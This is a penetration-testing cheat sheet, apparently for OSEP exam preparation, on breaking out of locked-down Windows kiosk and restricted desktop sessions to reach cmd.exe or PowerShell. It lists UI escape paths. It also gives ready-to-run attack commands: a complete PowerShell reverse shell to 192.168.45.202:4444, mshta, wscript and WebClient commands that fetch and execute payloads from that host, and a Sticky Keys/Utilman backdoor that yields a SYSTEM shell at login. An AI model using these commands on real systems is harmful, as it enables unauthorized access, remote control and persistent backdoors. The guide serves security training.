# Kiosk & Restricted Desktop Breakouts

A kiosk machine runs a locked-down Windows environment — typically a single application (browser, POS software, RDP client) with no visible taskbar, no desktop icons, and no obvious way to get a command prompt. The goal is to escape to `cmd.exe` or `powershell.exe`.

**OSEP context:** You will receive credentials for a kiosk machine or arrive at a restricted desktop session. Everything below assumes you can interact with the UI.

---

## Step 1: Recon — What Do You Have Access To?

Before trying anything, map your attack surface:

```
Can you see a browser?           → Method 1, 2
Can you see any application?     → Method 3 (Open/Save dialog)
Can you see a taskbar?           → Method 4 (Task Manager)
Can you right-click desktop?     → Method 5
Is there a help menu?            → Method 6
Can you access File Explorer?    → navigate directly to cmd.exe
Is there a print function?       → Method 7 (Print-to-PDF)
Can you reach a URL?             → Method 8 (URI schemes)
```

---

## Method 1: Browser Address Bar → cmd.exe

If any browser is accessible (IE, Edge, Chrome, Firefox):

```
# Navigate to cmd.exe directly:
file:///C:/Windows/System32/cmd.exe

# If cmd.exe is blocked by name, try:
file:///C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
file:///C:/Windows/SysWOW64/cmd.exe

# Or navigate to a writable folder and double-click a payload:
file:///C:/Windows/Temp/
```

Alternatively, use the browser to download a payload:
```
http://192.168.45.202/payload.exe
# Then find Downloads folder and execute it
```

---

## Method 2: Browser Dev Tools → JS Execution

In browsers where DevTools are accessible (F12 or Ctrl+Shift+I):

```javascript
// Chrome/Edge DevTools Console:
// This opens cmd.exe via ActiveX (IE only) or shell execution
// On IE with ActiveX:
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe");
```

More reliably — search for a URL in the browser that loads your HTA:
```
http://192.168.45.202/payload.hta
```
mshta will run it if the browser passes the download to Windows.

---

## Method 3: Open/Save Dialog Escape (Works in Almost Any App)

**The most reliable kiosk escape.** Any Windows application with a File → Open or File → Save As dialog exposes the Windows shell.

1. Trigger an Open/Save dialog (File → Open, File → Save As, Insert Image, Browse...)
2. In the filename bar, type: `cmd.exe` and press Enter
3. Or navigate to `C:\Windows\System32\` and double-click `cmd.exe`
4. Or type the full path: `C:\Windows\System32\cmd.exe`

**Alternative in the dialog:**
- Right-click any empty space in the file browser area → Open command prompt here (sometimes present)
- In the filename field: `powershell Start-Process cmd` then Enter

**Application-specific triggers:**
- **Word/Excel/LibreOffice**: Insert → Object → Browse... OR File → Open
- **Paint**: File → Open
- **Any help viewer**: File → Open (many help viewers have this)
- **Notepad** (if accessible): File → Open
- **Task Scheduler** (if accessible): Browse for executable
- **Registry Editor**: File → Import

---

## Method 4: Task Manager

If Ctrl+Shift+Esc works, or if you can right-click a visible taskbar:

```
Task Manager → File → Run New Task → cmd.exe
```

Check "Create this task with administrative privileges" if UAC prompt appears and you have credentials.

Also try:
```
Task Manager → File → Run New Task → explorer.exe
```
(Restores a full desktop from which you can access everything)

---

## Method 5: Right-Click Desktop Context Menu

If the desktop is accessible and right-click works:
- Right-click → Open Terminal / PowerShell (Windows 11 has this by default)
- Right-click → New → Shortcut → Target: `cmd.exe`

---

## Method 6: Help Menu Escape

Many applications have a Help menu that opens a Windows Help viewer or a browser.

1. Open Help (F1 or Help menu)
2. Look for hyperlinks in the help content — click one to open a browser
3. Use the browser (Method 1/2)
4. Or: Help viewer → File → Open (if available)

**Windows Help viewer (hh.exe) specific:**
- If you can get hh.exe to open, use File → Open to browse to cmd.exe

---

## Method 7: Print-to-PDF / XPS Dialog Shell Escape

1. In any application, trigger File → Print
2. Select "Microsoft Print to PDF" or "Microsoft XPS Document Writer" as printer
3. Click Print
4. A Save As dialog appears (Windows native file picker)
5. Navigate to `C:\Windows\System32\`
6. In the filename field: type `cmd.exe` and press Enter
7. When the "file format mismatch" error appears — you're already running cmd.exe from the shell

Or in the Save As dialog:
- Hold Shift and right-click any empty area → "Open PowerShell window here" (available in Win10+)

---

## Method 8: URI Protocol Handler Abuse

Windows registers many URI handlers. Calling them from a browser address bar or Run dialog (Win+R if accessible):

```
# Open Settings (may have links to file explorer, apps)
ms-settings:

# Open Windows Store
ms-windows-store:

# Calculator (then File → something?)
calculator:

# Default programs UI — may expose file browser
ms-settings:defaultapps

# Open a specific folder via file explorer:
shell:startup
shell:appdata
shell:sendto
shell:System        ← C:\Windows\System32 — double-click cmd.exe

# Windows Security app
windowsdefender:
```

---

## Method 9: Sticky Keys / Utilman Backdoor (Offline / Admin Access Required)

**Use when:** You have access to the machine's disk offline (PXE boot, shadow copy, physical access) or when you have admin access and need to set a persistent breakout for a locked screen.

Replace `sethc.exe` (Sticky Keys) with `cmd.exe`. When you press Shift 5 times at the login screen, you get a SYSTEM cmd instead of Sticky Keys.

```bash
# Method A: Via Volume Shadow Copy (if you have admin and can access a shell)
vssadmin create shadow /for=C:
# Note the shadow path (e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# Now: at login screen, press Shift 5 times → SYSTEM cmd

# Restore after use:
copy C:\Windows\System32\sethc.bak C:\Windows\System32\sethc.exe
del C:\Windows\System32\sethc.bak

# Utilman.exe (Win+U at login screen):
copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

---

## Method 10: Application-Specific Escapes

### Internet Explorer Enhanced Security
- Address bar → `about:blank` → View → Source → opens Notepad → File → Open → cmd.exe

### Microsoft Edge (Legacy/Chromium)
- `edge://flags` in address bar → may expose developer settings
- `CTRL+O` or `CTRL+S` → file picker

### Outlook (if accessible)
- New Email → Insert → Attach File → file browser → navigate to cmd.exe

### Adobe Reader
- Edit → Preferences → Security → (any Browse button) → navigate to cmd.exe

### Any .NET Application
- If it crashes or throws an exception, the error dialog may have a "Details" link
- Click Details → opens Event Viewer or a dialog with links → exploit

---

## Method 11: RDP Restricted Admin Mode Escape

If you're connecting via RDP and land in a restricted session:

```powershell
# Check if you can break out of the RemoteApp:
# Press Win+R (if enabled) → cmd.exe
# Press Ctrl+Alt+Del → Task Manager → File → Run New Task

# If session is disconnected instead of locked:
# tscon.exe (see lateral movement) to take over other sessions
```

---

## Method 12: Windows Run Dialog (Win+R)

If Win+R is not blocked:
```
cmd.exe
powershell.exe
mshta http://192.168.45.202/payload.hta
wscript.exe //nologo \\192.168.45.202\share\payload.js
```

---

## After Getting cmd.exe — Verify and Escalate

```cmd
# Confirm you have a shell
whoami
hostname
ipconfig

# Check what you can do
whoami /priv
net localgroup administrators

# Get a proper reverse shell back to Kali (don't work in the kiosk shell — get proper access)
powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.45.202',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=[text.encoding]::ASCII.GetBytes($o+' PS> ');$s.Write($ob,0,$ob.Length)};$c.Close()"

# Download and run a full loader from Kali:
(New-Object Net.WebClient).DownloadFile('http://192.168.45.202/loader.exe','C:\Windows\Temp\l.exe')
C:\Windows\Temp\l.exe
```

---

## Exam Checklist — Try in This Order

```
□ Win+R available? → cmd.exe
□ Browser address bar? → file:///C:/Windows/System32/cmd.exe
□ Any application with File → Open? → navigate to cmd.exe
□ Task Manager accessible? (Ctrl+Shift+Esc) → File → Run New Task
□ Print function? → Print to PDF → Save As dialog → cmd.exe
□ Help menu? → follow links → browser → address bar
□ Right-click desktop? → Open Terminal
□ URI schemes from browser? → shell:System
```
